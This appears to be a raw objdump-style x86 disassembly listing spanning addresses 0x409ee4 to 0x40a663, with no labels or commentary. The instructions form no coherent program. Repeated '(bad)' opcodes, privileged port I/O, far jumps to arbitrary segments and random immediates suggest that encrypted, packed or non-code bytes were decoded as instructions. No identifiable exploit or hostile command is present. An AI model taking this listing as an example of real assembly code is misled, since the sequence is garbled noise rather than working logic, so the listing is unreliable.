  409ee4:	lods   eax,DWORD PTR ds:[esi]
  409ee5:	push   es
  409ee6:	dec    esp
  409ee7:	outs   dx,BYTE PTR ds:[esi]
  409ee8:	scas   al,BYTE PTR es:[edi]
  409ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eea:	movlhps xmm6,xmm0
  409eed:	scas   eax,DWORD PTR es:[edi]
  409eee:	arpl   WORD PTR [edi+0x3857e1c0],cx
  409ef4:	jmp    FWORD PTR [esi+0x51d22c43]
  409efa:	(bad)  
  409efc:	mov    al,ds:0x202cef51
  409f01:	gs popf 
  409f03:	loope  0x409f4b
  409f05:	or     DWORD PTR [ebp+esi*1+0x35],esi
  409f09:	pop    ds
  409f0a:	pop    ss
  409f0b:	std    
  409f0c:	sbb    DWORD PTR [eax],esp
  409f0e:	adc    DWORD PTR [esi+0x2a],ebp
  409f11:	sbb    bh,BYTE PTR [ecx+0x3fdf7d3]
  409f17:	lahf   
  409f18:	outs   dx,BYTE PTR ds:[esi]
  409f19:	inc    esp
  409f1a:	stos   DWORD PTR es:[edi],eax
  409f1b:	std    
  409f1c:	cmp    BYTE PTR [ecx+0x7e],0xb8
  409f20:	(bad)  
  409f21:	aam    0x1
  409f23:	mov    bl,al
  409f25:	nop
  409f26:	lds    ecx,FWORD PTR [edi+0x99a5a28]
  409f2c:	push   edi
  409f2d:	scas   al,BYTE PTR es:[edi]
  409f2e:	and    cl,BYTE PTR [eax]
  409f30:	das    
  409f31:	jo     0x409f63
  409f33:	sub    eax,0xd71065de
  409f38:	in     eax,dx
  409f39:	mov    edx,0x1bbd3e46
  409f3e:	jnp    0x409f67
  409f40:	mov    ecx,0x40e38e9f
  409f45:	dec    eax
  409f46:	dec    esp
  409f47:	out    0x9d,eax
  409f49:	mov    eax,ds:0x4644402d
  409f4e:	and    al,0xe8
  409f50:	mov    ebp,0xa72808b1
  409f55:	pusha  
  409f56:	pop    es
  409f57:	adc    BYTE PTR [ebx-0x2c7d65de],ch
  409f5d:	rep lods eax,DWORD PTR ds:[esi]
  409f5f:	sbb    ebx,esi
  409f61:	stc    
  409f62:	add    BYTE PTR [ebx],bl
  409f64:	xor    ecx,DWORD PTR [ecx]
  409f66:	push   ebp
  409f67:	add    esi,DWORD PTR [ecx-0x56]
  409f6a:	jmp    0x409f76
  409f6c:	outs   dx,BYTE PTR ds:[esi]
  409f6d:	mov    al,ds:0xa3b840db
  409f72:	add    dh,BYTE PTR [ebp+0x5d50629e]
  409f78:	jge    0x409fb0
  409f7a:	sar    BYTE PTR [ecx+eiz*8+0x5],0xb6
  409f7f:	fdivr  QWORD PTR [edx+0x0]
  409f82:	imul   edi,DWORD PTR [edx-0x44],0xa244b093
  409f89:	pop    eax
  409f8a:	das    
  409f8b:	out    0x5c,al
  409f8d:	xchg   ecx,ebx
  409f8f:	test   BYTE PTR ds:[ebp-0x3e],dl
  409f93:	mov    al,BYTE PTR [ecx]
  409f95:	inc    esp
  409f96:	fist   WORD PTR [eax+0x1e]
  409f99:	nop
  409f9a:	sub    eax,DWORD PTR [ecx+0x52]
  409f9d:	ror    BYTE PTR [ecx-0xe],0x2f
  409fa1:	loop   0x409fd5
  409fa3:	sbb    esp,DWORD PTR [esi+0x629679db]
  409fa9:	cli    
  409faa:	dec    ebp
  409fab:	xor    eax,0xa52ec0c2
  409fb0:	bound  esp,QWORD PTR [edx-0x7e]
  409fb3:	push   es
  409fb4:	adc    ecx,esp
  409fb6:	dec    ecx
  409fb7:	sbb    DWORD PTR [ebx+0x49624a09],edx
  409fbd:	push   ds
  409fbe:	sub    BYTE PTR [ebp+0x6d2950c2],dl
  409fc4:	inc    esi
  409fc5:	ja     0x409f86
  409fc7:	pop    esp
  409fc8:	daa    
  409fc9:	popa   
  409fca:	int    0x32
  409fcc:	push   ss
  409fcd:	xor    eax,0xe5f57771
  409fd2:	mov    esp,eax
  409fd4:	mov    eax,ds:0xd862a422
  409fd9:	or     ecx,DWORD PTR [edx-0x1a]
  409fdc:	xchg   bh,bl
  409fde:	xchg   esp,eax
  409fdf:	stc    
  409fe0:	ret    0x30d0
  409fe3:	(bad)
  409fe7:	push   eax
  409fe8:	xor    BYTE PTR [ebx],dh
  409fea:	mov    BYTE PTR [esi-0x2e],bh
  409fed:	add    eax,0x174efa2b
  409ff2:	jae    0x409f87
  409ff4:	fild   WORD PTR [eax-0x5e]
  409ff7:	push   cs
  409ff8:	loope  0x409f7f
  409ffa:	fistp  DWORD PTR [ebp-0x1241ba79]
  40a000:	jg     0x40a01b
  40a002:	inc    BYTE PTR [edi+0xbbe6e80]
  40a008:	jle    0x409ff0
  40a00a:	aaa    
  40a00b:	iret   
  40a00c:	test   al,0xa8
  40a00e:	push   edx
  40a00f:	pop    ecx
  40a010:	jo     0x40a04f
  40a012:	jne    0x409fb9
  40a014:	pop    ebx
  40a015:	jbe    0x409fe5
  40a017:	int3   
  40a018:	push   es
  40a019:	xchg   ebp,eax
  40a01a:	mov    eax,ds:0x2a9777ec
  40a01f:	call   0xe75dae41
  40a024:	jg     0x40a091
  40a026:	lods   eax,DWORD PTR ds:[esi]
  40a027:	adc    bl,BYTE PTR [ebx-0x62]
  40a02a:	add    eax,DWORD PTR [edx]
  40a02c:	dec    ecx
  40a02d:	std    
  40a02e:	push   ss
  40a02f:	push   0xa70b6e58
  40a034:	push   esi
  40a035:	mov    ch,0x14
  40a037:	fdivp  st(5),st
  40a039:	pop    esp
  40a03a:	or     DWORD PTR [edi+0x37],edi
  40a03d:	outs   dx,BYTE PTR ds:[esi]
  40a03e:	sbb    eax,0x48b7f4ee
  40a043:	mov    ah,0x95
  40a045:	sub    eax,0xe88eddd4
  40a04a:	lds    esi,FWORD PTR [ecx]
  40a04c:	dec    edi
  40a04d:	pop    es
  40a04e:	into   
  40a04f:	test   esp,ebx
  40a051:	sahf   
  40a052:	jp     0x40a070
  40a054:	stc    
  40a055:	pusha  
  40a056:	mov    bl,0xe0
  40a058:	ror    DWORD PTR [ecx],cl
  40a05a:	xchg   ecx,eax
  40a05b:	and    al,0x79
  40a05d:	dec    esi
  40a05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a05f:	out    dx,eax
  40a060:	lock pop ebp
  40a062:	jne    0x40a0d1
  40a064:	xchg   edi,eax
  40a065:	in     al,dx
  40a066:	dec    esi
  40a067:	cmp    DWORD PTR [ecx+0x94d8a08],ebx
  40a06d:	pop    esi
  40a06e:	stos   BYTE PTR es:[edi],al
  40a06f:	add    eax,0x42aed1d3
  40a074:	retf   
  40a075:	je     0x40a0e3
  40a077:	push   eax
  40a078:	outs   dx,BYTE PTR ds:[esi]
  40a079:	mov    dl,0xfd
  40a07b:	daa    
  40a07c:	mov    DWORD PTR [ecx],esp
  40a07e:	cld    
  40a07f:	mov    ds:0xce4dd9de,al
  40a084:	mov    esi,DWORD PTR [esi]
  40a086:	xor    al,0x2d
  40a088:	test   al,0x90
  40a08a:	call   FWORD PTR [ebx+ecx*8-0x1f]
  40a08e:	jb     0x40a0c4
  40a090:	inc    esi
  40a091:	jle    0x40a064
  40a093:	data16 std 
  40a095:	test   BYTE PTR [eax-0x5f206ffc],dl
  40a09b:	lock mov al,ds:0x9ead1f70
  40a0a1:	aas    
  40a0a2:	aad    0x82
  40a0a4:	jg     0x40a05d
  40a0a6:	mov    eax,ds:0xc520ba29
  40a0ab:	xor    eax,0xc78e893e
  40a0b0:	jne    0x40a10a
  40a0b2:	nop
  40a0b3:	inc    esi
  40a0b4:	pop    ss
  40a0b5:	es xchg ebp,eax
  40a0b7:	sub    ecx,0x28f28f71
  40a0bd:	leave  
  40a0be:	jns    0x40a0ea
  40a0c0:	aad    0x42
  40a0c2:	sub    DWORD PTR [edx+esi*4-0x27],0x1dd6e70b
  40a0ca:	sub    eax,0x821a2abb
  40a0cf:	or     edi,DWORD PTR [eax+0x49d7ac33]
  40a0d5:	cmp    ebx,DWORD PTR [esi]
  40a0d7:	aas    
  40a0d8:	ins    DWORD PTR es:[edi],dx
  40a0d9:	addr16 xchg edi,eax
  40a0db:	and    al,0xe3
  40a0dd:	push   ecx
  40a0de:	cmp    eax,0x669fef4f
  40a0e3:	xchg   edx,eax
  40a0e4:	xor    al,0xc9
  40a0e6:	repz sar DWORD PTR [ebx+0x11bb4683],1
  40a0ed:	loope  0x40a073
  40a0ef:	jno    0x40a128
  40a0f1:	adc    ebx,DWORD PTR [ebx+0x3f]
  40a0f4:	mov    cs,WORD PTR [ecx]
  40a0f6:	xchg   ebx,eax
  40a0f7:	into   
  40a0f8:	out    0xc9,al
  40a0fa:	cld    
  40a0fb:	push   edx
  40a0fc:	fdiv   QWORD PTR [esi]
  40a0fe:	fwait
  40a0ff:	js     0x40a0d3
  40a101:	ret    
  40a102:	xchg   edx,eax
  40a103:	add    bl,ch
  40a105:	mov    esi,0xed6d4ec0
  40a10a:	push   ecx
  40a10b:	or     DWORD PTR [esi-0x47],ebx
  40a10e:	mov    ah,0xd6
  40a110:	xor    eax,DWORD PTR [ebx-0x7b]
  40a113:	loop   0x40a0f1
  40a115:	xchg   ecx,eax
  40a116:	sbb    DWORD PTR [esi],esi
  40a118:	into   
  40a119:	jmp    0x955e64d1
  40a11e:	and    eax,0xd4bc9333
  40a123:	pcmpeqd mm1,QWORD PTR [ecx-0x26]
  40a127:	pop    ebp
  40a128:	lods   al,BYTE PTR ds:[esi]
  40a129:	xchg   ebp,eax
  40a12a:	(bad)  
  40a12b:	inc    eax
  40a12c:	mov    bh,BYTE PTR [esi]
  40a12e:	shl    DWORD PTR [edi+0x33],0x89
  40a132:	lahf   
  40a133:	cmp    BYTE PTR [ebp+0x1ff92c19],dh
  40a139:	sub    BYTE PTR [esi+0x5b],ah
  40a13c:	inc    esi
  40a13d:	dec    ebp
  40a13e:	mov    ch,0x62
  40a140:	cmc    
  40a141:	js     0x40a0d1
  40a143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a144:	mov    al,0xa5
  40a146:	rol    DWORD PTR [edx],0xee
  40a149:	or     ah,BYTE PTR [ebp-0xe]
  40a14c:	dec    edi
  40a14d:	iret   
  40a14e:	mov    DWORD PTR [ebp+0x53f13687],eax
  40a154:	ret    
  40a155:	xor    edx,DWORD PTR [esp+esi*4-0x5795f288]
  40a15c:	nop
  40a15d:	les    ebx,FWORD PTR gs:[ebp-0x4e6493c4]
  40a164:	int3   
  40a165:	call   0xd9ff264
  40a16a:	out    dx,eax
  40a16b:	add    ebp,ebp
  40a16d:	dec    edi
  40a16e:	xchg   esi,eax
  40a16f:	dec    edx
  40a170:	add    bl,BYTE PTR [ebp-0x78]
  40a173:	test   DWORD PTR [esi+0x2d],ecx
  40a176:	pop    edx
  40a177:	xchg   ebx,eax
  40a178:	xchg   esi,eax
  40a179:	sbb    bl,BYTE PTR [edi-0x1c5cbdfd]
  40a17f:	mov    bh,0x2c
  40a181:	out    0xf6,al
  40a183:	pop    edi
  40a184:	scas   al,BYTE PTR es:[edi]
  40a185:	sbb    esi,ebp
  40a187:	sub    ah,0x9c
  40a18a:	aas    
  40a18b:	mov    edx,0xd19e6280
  40a190:	mov    eax,0x6a2c58e2
  40a195:	dec    esi
  40a196:	ins    BYTE PTR es:[edi],dx
  40a197:	and    al,0x16
  40a199:	mov    BYTE PTR [esi+0xa],al
  40a19c:	adc    BYTE PTR [ebx+0x6cd44cc8],al
  40a1a2:	mov    bh,0xdd
  40a1a4:	loope  0x40a153
  40a1a6:	cmp    bh,BYTE PTR [esi+0x5b]
  40a1a9:	inc    edi
  40a1aa:	xor    eax,0xc5bde2f3
  40a1af:	icebp  
  40a1b0:	ret    0x2a31
  40a1b3:	dec    ebp
  40a1b4:	ins    DWORD PTR es:[edi],dx
  40a1b5:	inc    ebp
  40a1b6:	lods   al,BYTE PTR ds:[esi]
  40a1b7:	mov    edx,0x9915c82b
  40a1bc:	pop    edi
  40a1bd:	xchg   ecx,eax
  40a1be:	xchg   ebp,eax
  40a1bf:	dec    edx
  40a1c0:	sbb    al,0x5e
  40a1c2:	test   eax,0x578fa6be
  40a1c7:	pop    ecx
  40a1c8:	sub    ah,dl
  40a1ca:	loopne 0x40a1ca
  40a1cc:	sub    bh,dl
  40a1ce:	fnstenv [esi]
  40a1d0:	mov    WORD PTR [edx-0x7b9587a7],cs
  40a1d6:	pusha  
  40a1d7:	dec    ebp
  40a1d8:	cmp    edi,DWORD PTR [ebx+0x7f8a85dc]
  40a1de:	or     bl,BYTE PTR [ecx]
  40a1e0:	push   edi
  40a1e1:	ret    
  40a1e2:	mov    bl,0xe0
  40a1e4:	xor    esp,DWORD PTR [edx]
  40a1e6:	hlt    
  40a1e7:	mov    ah,0xce
  40a1e9:	cwde   
  40a1ea:	arpl   WORD PTR [esi-0xd09f724],cx
  40a1f0:	neg    DWORD PTR [ebx+0x4845b717]
  40a1f6:	addr16 add al,0x73
  40a1f9:	call   DWORD PTR [eax]
  40a1fb:	stc    
  40a1fc:	jecxz  0x40a23d
  40a1fe:	shr    BYTE PTR [ebx+0x2bf6c5ad],cl
  40a204:	or     eax,0xa6e42cf2
  40a209:	or     BYTE PTR [edx],ah
  40a20b:	ror    DWORD PTR [eax+0xd],cl
  40a20e:	lods   eax,DWORD PTR ds:[esi]
  40a20f:	(bad)  
  40a210:	imul   ebx,DWORD PTR [ebp-0x6df95f56],0xffffffd5
  40a217:	push   es
  40a218:	imul   esi,eax,0x77fb0e12
  40a21e:	jecxz  0x40a1f3
  40a220:	jl     0x40a21e
  40a222:	outs   dx,DWORD PTR ds:[esi]
  40a223:	jle    0x40a1ec
  40a225:	test   BYTE PTR [ebx],cl
  40a227:	loop   0x40a1f1
  40a229:	es fsub st,st(3)
  40a22c:	xor    DWORD PTR [ebp+0x9],esi
  40a22f:	pusha  
  40a230:	shr    DWORD PTR [edx+0x1be9c934],0x1d
  40a237:	jge    0x40a299
  40a239:	mov    ebp,0x4341c90f
  40a23e:	popf   
  40a23f:	push   cs
  40a240:	cld    
  40a241:	sbb    DWORD PTR [esi+0x69],0x7968e131
  40a248:	lods   eax,DWORD PTR ds:[esi]
  40a249:	loopne 0x40a1f3
  40a24b:	pop    edi
  40a24c:	mov    esi,0x55748fb0
  40a251:	inc    eax
  40a252:	cld    
  40a253:	sub    eax,0xbebfca1d
  40a258:	out    0x97,eax
  40a25a:	daa    
  40a25b:	rol    esp,cl
  40a25d:	into   
  40a25e:	loop   0x40a203
  40a260:	xlat   BYTE PTR ds:[ebx]
  40a261:	(bad)  
  40a262:	lea    eax,[edx]
  40a264:	xchg   esp,eax
  40a265:	lahf   
  40a266:	outs   dx,DWORD PTR ds:[esi]
  40a267:	push   edx
  40a268:	xchg   edi,eax
  40a269:	or     esi,0xffffffbf
  40a26c:	or     eax,0x5c9ed205
  40a271:	es cld 
  40a273:	shr    BYTE PTR [edx],0x51
  40a276:	jmp    0xc6be:0xf8682c8a
  40a27d:	popa   
  40a27e:	mov    bl,bh
  40a280:	jecxz  0x40a20e
  40a282:	mov    esi,0x5775322d
  40a287:	jecxz  0x40a22c
  40a289:	out    dx,eax
  40a28a:	dec    eax
  40a28b:	jge    0x40a29e
  40a28d:	push   ebp
  40a28e:	lods   al,BYTE PTR ds:[esi]
  40a28f:	mov    edx,0x823b9562
  40a294:	fcmove st,st(4)
  40a296:	or     al,0xce
  40a298:	cmp    DWORD PTR ds:0x3b42789a,edi
  40a29e:	into   
  40a29f:	mov    dl,0xa
  40a2a1:	mov    bh,0x0
  40a2a3:	xchg   esi,eax
  40a2a4:	ret    0x3141
  40a2a7:	adc    ch,dl
  40a2a9:	pop    esi
  40a2aa:	adc    DWORD PTR [ebp-0x2caa1d3a],ebp
  40a2b0:	sub    eax,esp
  40a2b2:	xchg   ebx,eax
  40a2b3:	test   DWORD PTR [ecx-0x43],ecx
  40a2b6:	es clc 
  40a2b8:	push   0x88e7429f
  40a2bd:	sub    ax,0x2610
  40a2c1:	cmp    eax,edi
  40a2c3:	sbb    eax,0x30e1997b
  40a2c8:	jge    0x40a280
  40a2ca:	lods   al,BYTE PTR ds:[esi]
  40a2cb:	and    edx,DWORD PTR ds:0xd6f515cc
  40a2d1:	fidiv  DWORD PTR [edi-0x3d6e6bca]
  40a2d7:	ret    0x3a6e
  40a2da:	mov    ah,0x60
  40a2dc:	cmp    DWORD PTR [ebp+0x14],esi
  40a2df:	dec    esp
  40a2e0:	add    al,0x68
  40a2e2:	fbstp  TBYTE PTR [edx]
  40a2e4:	in     eax,dx
  40a2e5:	pop    ebx
  40a2e6:	popa   
  40a2e7:	or     ebp,DWORD PTR ds:[esi+0x42]
  40a2eb:	es jp  0x40a296
  40a2ee:	pop    DWORD PTR [ebx-0x340f2a0b]
  40a2f4:	sub    ebx,DWORD PTR [edi-0x1f]
  40a2f7:	add    BYTE PTR [esi-0x13],bl
  40a2fa:	sbb    edi,DWORD PTR [esi]
  40a2fc:	sbb    eax,0x13c0496b
  40a301:	mov    BYTE PTR [ecx+0x1f],ah
  40a304:	push   esi
  40a305:	jbe    0x40a311
  40a307:	nop
  40a308:	repz js 0x40a2f1
  40a30b:	jl     0x40a2cd
  40a30d:	push   ebp
  40a30e:	push   0x6b0a88e2
  40a313:	inc    esp
  40a314:	mov    dh,0x16
  40a316:	iret   
  40a317:	pop    edi
  40a318:	sti    
  40a319:	sub    bl,BYTE PTR [edx+0x25]
  40a31c:	int3   
  40a31d:	adc    edi,0x3a
  40a320:	cld    
  40a321:	lds    edx,FWORD PTR [ebx-0x14]
  40a324:	std    
  40a325:	inc    ebx
  40a326:	arpl   WORD PTR [edi],di
  40a328:	adc    edi,DWORD PTR [edx+0x55596d2d]
  40a32e:	adc    al,0x4
  40a330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a331:	outs   dx,DWORD PTR ds:[esi]
  40a332:	mov    dl,0xda
  40a334:	test   DWORD PTR [ebx+0x30],0xffd835b0
  40a33b:	mov    al,ds:0x4e58f5e2
  40a340:	loop   0x40a31c
  40a342:	ret    0xcfdc
  40a345:	pop    eax
  40a346:	fwait
  40a347:	dec    esi
  40a348:	cld    
  40a349:	push   eax
  40a34a:	data16 jecxz 0x40a2fa
  40a34d:	and    eax,0x928f913a
  40a352:	and    DWORD PTR [edi+ecx*8-0x5237dc7d],ebp
  40a359:	dec    ebx
  40a35a:	and    eax,0xb73d0d2a
  40a35f:	sub    DWORD PTR [esi+0x1c],0xfffffffa
  40a363:	xchg   BYTE PTR [edi+0x9064ac],dh
  40a369:	sbb    ax,0xa9fc
  40a36d:	jne    0x40a35f
  40a36f:	inc    esp
  40a370:	mov    ah,0x34
  40a372:	push   cs
  40a373:	in     eax,dx
  40a374:	ret    
  40a375:	mov    ch,0xfe
  40a377:	jb     0x40a32d
  40a379:	cld    
  40a37a:	or     eax,0x6db1f592
  40a37f:	aas    
  40a380:	push   0xffffff87
  40a382:	inc    edi
  40a383:	enter  0x18b8,0x4b
  40a387:	or     bh,BYTE PTR [ebp-0x24a722ce]
  40a38d:	enter  0xdba8,0x5d
  40a391:	clc    
  40a392:	jmp    0x40a3c1
  40a394:	imul   edi,DWORD PTR [eax-0x38adf6e4],0xc
  40a39b:	ficomp DWORD PTR [esi+0x3a]
  40a39e:	xor    BYTE PTR [esi],0xda
  40a3a1:	das    
  40a3a2:	xchg   ebp,eax
  40a3a3:	lock scas eax,DWORD PTR es:[edi]
  40a3a5:	inc    ebx
  40a3a6:	ret    
  40a3a7:	pusha  
  40a3a8:	lock cmp ebp,edi
  40a3ab:	sub    al,BYTE PTR [edx-0x78e50507]
  40a3b1:	setle  ch
  40a3b4:	lea    eax,[esi-0x5fa4845f]
  40a3ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3bb:	bound  esi,QWORD PTR [ecx-0x7607034b]
  40a3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3c2:	xchg   esi,eax
  40a3c3:	repz jno 0x40a362
  40a3c6:	mov    esp,es
  40a3c8:	jmp    0xc192:0xb06a3038
  40a3cf:	cmc    
  40a3d0:	dec    edi
  40a3d1:	pop    es
  40a3d2:	retf   0xab70
  40a3d5:	clc    
  40a3d6:	ret    
  40a3d7:	mov    al,BYTE PTR [eax+0x3a86dae9]
  40a3dd:	mov    eax,ds:0xf4a69f24
  40a3e2:	push   edi
  40a3e3:	jmp    0xbfbf159e
  40a3e8:	inc    ebp
  40a3e9:	pop    ss
  40a3ea:	and    eax,0xa8f625d1
  40a3ef:	lahf   
  40a3f0:	mov    bh,0xb2
  40a3f2:	mov    ds:0xd7e44b81,al
  40a3f7:	ja     0x40a464
  40a3f9:	pusha  
  40a3fa:	repnz test DWORD PTR [esi],esi
  40a3fd:	out    0xf2,eax
  40a3ff:	ins    BYTE PTR es:[edi],dx
  40a400:	xlat   BYTE PTR ds:[ebx]
  40a401:	arpl   WORD PTR [ecx-0x75],ax
  40a404:	sahf   
  40a405:	mov    cl,0x35
  40a407:	sbb    eax,0x66ff704e
  40a40c:	aam    0x33
  40a40e:	out    0xe7,eax
  40a410:	shr    ebx,1
  40a412:	mov    al,0x31
  40a414:	xchg   esp,eax
  40a415:	push   esi
  40a416:	mov    bl,0x39
  40a418:	ficomp DWORD PTR [ebx+0x7661ff00]
  40a41e:	push   DWORD PTR [ecx-0x9dd9883]
  40a424:	mov    ebp,0x97d0197
  40a429:	xor    BYTE PTR [ecx-0x1a8dd31c],cl
  40a42f:	daa    
  40a430:	jge    0x40a3c5
  40a432:	cmp    ebp,DWORD PTR [esi-0x16]
  40a435:	add    eax,DWORD PTR [edi-0x3cf4cbe3]
  40a43b:	push   esi
  40a43c:	enter  0xeda1,0xc4
  40a440:	js     0x40a493
  40a442:	sub    ah,cl
  40a444:	push   esp
  40a445:	out    0xcb,al
  40a447:	or     dh,ch
  40a449:	sub    eax,0x38a88994
  40a44e:	scas   eax,DWORD PTR es:[edi]
  40a44f:	mov    eax,0xcb1f0ca5
  40a454:	jge    0x40a43f
  40a456:	aas    
  40a457:	shr    DWORD PTR [ebx],1
  40a459:	jge    0x40a486
  40a45b:	adc    eax,DWORD PTR ds:0x754132ca
  40a461:	cmp    al,0xba
  40a463:	sbb    ch,BYTE PTR [ecx-0x5b]
  40a466:	imul   DWORD PTR [eax+0x44]
  40a469:	das    
  40a46a:	and    al,dl
  40a46c:	and    eax,0xe0d2044c
  40a471:	pop    esi
  40a472:	sbb    BYTE PTR [ecx+0x69],bl
  40a475:	pop    ecx
  40a476:	mov    ds:0x9ec280,eax
  40a47b:	xor    BYTE PTR [esi+eax*1-0x7b8bb1f2],bl
  40a482:	xchg   esi,eax
  40a483:	neg    BYTE PTR ds:0x5a4a1fbe
  40a489:	xchg   ebp,eax
  40a48a:	shl    BYTE PTR [eax-0x2d],cl
  40a48d:	test   BYTE PTR [edx+0x2e],dh
  40a490:	call   0x760eb0da
  40a495:	(bad)  
  40a498:	mov    eax,ds:0x73d8dd9d
  40a49d:	mov    edi,0x41d262f2
  40a4a2:	fdiv   DWORD PTR [eax]
  40a4a4:	loopne 0x40a4de
  40a4a6:	lea    edi,[edx-0x74]
  40a4a9:	pop    esi
  40a4aa:	sbb    eax,0x5cfa3a23
  40a4af:	sbb    eax,0xb83203e7
  40a4b4:	inc    edx
  40a4b5:	sub    BYTE PTR [edx-0x59138303],ah
  40a4bb:	loop   0x40a504
  40a4bd:	and    dl,BYTE PTR [eax+0x11]
  40a4c0:	inc    esp
  40a4c1:	push   es
  40a4c2:	mov    BYTE PTR [edi-0x5a4b7edb],0xea
  40a4c9:	call   0x4b7e2690
  40a4ce:	xchg   DWORD PTR [ebx],edx
  40a4d0:	adc    bh,dh
  40a4d2:	adc    eax,0xa2463b00
  40a4d7:	jae    0x40a512
  40a4d9:	add    BYTE PTR [edx],cl
  40a4db:	out    0xba,eax
  40a4dd:	es leave 
  40a4df:	idiv   esi
  40a4e1:	into   
  40a4e2:	out    0x73,eax
  40a4e4:	mov    dl,0x21
  40a4e6:	mov    dh,0xeb
  40a4e8:	or     bh,cl
  40a4ea:	sub    eax,0x22aba045
  40a4ef:	mov    dh,0xd3
  40a4f1:	add    al,BYTE PTR [edx]
  40a4f3:	(bad)  
  40a4f4:	iret   
  40a4f5:	mov    al,ds:0x40f89042
  40a4fa:	push   ebx
  40a4fb:	dec    eax
  40a4fc:	out    0xde,eax
  40a4fe:	mov    esp,0x4a70055
  40a503:	stc    
  40a504:	ja     0x40a4c7
  40a506:	mov    eax,ds:0xa1dd4a2d
  40a50b:	fsubr  DWORD PTR [ecx-0x55]
  40a50e:	mov    eax,ds:0x94b8b1f0
  40a513:	aas    
  40a514:	retf   
  40a515:	jp     0x40a51b
  40a517:	out    dx,al
  40a518:	imul   ebx,DWORD PTR [ebp+0x66],0x16c39228
  40a51f:	iret   
  40a520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a521:	retf   
  40a522:	arpl   WORD PTR [esi+0x28],dx
  40a525:	pop    esp
  40a526:	jne    0x40a556
  40a528:	psubd  mm1,QWORD PTR cs:[ecx-0x3fdbf1a2]
  40a530:	daa    
  40a531:	sbb    esp,esi
  40a533:	jnp    0x40a54c
  40a535:	adc    al,0x47
  40a537:	bound  esp,QWORD PTR [edi+0x55b52fac]
  40a53d:	push   ebp
  40a53e:	(bad)
  40a541:	imul   ebx,DWORD PTR [esi],0x291b74c2
  40a547:	add    edx,edx
  40a549:	dec    esp
  40a54a:	rcr    DWORD PTR [edi+ebp*8+0x36],1
  40a54e:	jle    0x40a5c4
  40a550:	push   ecx
  40a551:	out    dx,al
  40a552:	or     al,cl
  40a554:	outs   dx,BYTE PTR ds:[esi]
  40a555:	mov    ds:0xae2dd2db,eax
  40a55a:	loope  0x40a58c
  40a55c:	add    DWORD PTR ds:0xde236998,ecx
  40a562:	sar    ah,0xa6
  40a565:	inc    ebp
  40a566:	adc    ch,BYTE PTR [edi+0x7]
  40a569:	rol    bl,cl
  40a56b:	push   0x17e11464
  40a570:	popf   
  40a571:	sbb    ebp,esp
  40a573:	xchg   ebp,eax
  40a574:	mov    WORD PTR [ebx+0x11],es
  40a577:	mov    edx,0x7b75f8e0
  40a57c:	data16 rcr BYTE PTR [edi+ebp*8],0xe6
  40a581:	shl    DWORD PTR [edx-0x52],cl
  40a584:	sbb    al,0x9e
  40a586:	je     0x40a59f
  40a588:	jg     0x40a596
  40a58a:	adc    ah,BYTE PTR [ebp+0x512ee402]
  40a590:	retf   0xeca4
  40a593:	mov    dl,0x95
  40a595:	mov    WORD PTR [ebp+0x3f],ss
  40a598:	scas   al,BYTE PTR es:[edi]
  40a599:	sub    eax,esp
  40a59b:	jecxz  0x40a611
  40a59d:	pop    es
  40a59e:	sub    ebp,edx
  40a5a0:	das    
  40a5a1:	jbe    0x40a5d9
  40a5a3:	cmp    al,dh
  40a5a5:	add    ebp,0x7cf069c2
  40a5ab:	pop    edi
  40a5ac:	xchg   ecx,eax
  40a5ad:	shl    DWORD PTR [ecx],0xdc
  40a5b0:	push   esi
  40a5b1:	and    ah,BYTE PTR [esi-0x1c572d43]
  40a5b7:	fs nop
  40a5b9:	or     al,0x32
  40a5bb:	ds jmp 0x7b2a00b2
  40a5c1:	pop    edx
  40a5c2:	pop    es
  40a5c3:	or     eax,0x6725a379
  40a5c8:	(bad)  
  40a5c9:	loop   0x40a5ce
  40a5cb:	cwde   
  40a5cc:	(bad)  
  40a5cd:	std    
  40a5ce:	jnp    0x40a631
  40a5d0:	and    ecx,edx
  40a5d2:	data16 and al,0x92
  40a5d5:	pusha  
  40a5d6:	lods   al,BYTE PTR ds:[esi]
  40a5d7:	mov    ah,0xde
  40a5d9:	aad    0x99
  40a5db:	scas   eax,DWORD PTR es:[edi]
  40a5dc:	jge    0x40a607
  40a5de:	inc    ebx
  40a5df:	dec    DWORD PTR [eax+0x6c]
  40a5e2:	call   0xbc80:0xa8705a03
  40a5e9:	rdpmc  
  40a5eb:	scas   eax,DWORD PTR es:[edi]
  40a5ec:	fidiv  WORD PTR [eax+0x4d785c20]
  40a5f2:	add    BYTE PTR [ecx+edi*4+0x462bb8f5],0xac
  40a5fa:	inc    ebp
  40a5fb:	mov    eax,0xfa15bf20
  40a600:	mov    ah,0x58
  40a602:	mov    esp,0xf3d9827d
  40a607:	jno    0x40a61e
  40a609:	mov    BYTE PTR [ebx-0x1f],ch
  40a60c:	sbb    BYTE PTR [eax],cl
  40a60e:	xchg   ebx,eax
  40a60f:	push   edx
  40a610:	adc    BYTE PTR [eax-0x15],0xf5
  40a614:	out    0xda,al
  40a616:	pop    ss
  40a617:	in     al,0xea
  40a619:	bound  ebx,QWORD PTR [ebp+ecx*8-0x70]
  40a61d:	add    al,0xe0
  40a61f:	jnp    0x40a612
  40a621:	jb     0x40a5c7
  40a623:	int3   
  40a624:	clc    
  40a625:	sub    al,0x13
  40a627:	xor    al,0xd2
  40a629:	jbe    0x40a61f
  40a62b:	inc    ecx
  40a62c:	pop    ebp
  40a62d:	ins    BYTE PTR es:[edi],dx
  40a62e:	xchg   edx,eax
  40a62f:	das    
  40a630:	mov    cl,0x5
  40a632:	aad    0x7b
  40a634:	mov    ecx,0xd39a9068
  40a639:	and    eax,0x3891c191
  40a63e:	call   0x5a11:0x6cc4a230
  40a645:	sub    esi,DWORD PTR [ebx+0x65]
  40a648:	push   es
  40a649:	mov    esp,0x1065dabb
  40a64e:	inc    eax
  40a64f:	ret    0x2f21
  40a652:	stos   DWORD PTR es:[edi],eax
  40a653:	or     bh,al
  40a655:	pop    ecx
  40a656:	jmp    0x40a630
  40a658:	mov    BYTE PTR [edx-0x18a0bff0],bh
  40a65e:	mov    bl,BYTE PTR [esi+0x20]
  40a661:	jge    0x40a67e
  40a663:	and    dh,cl
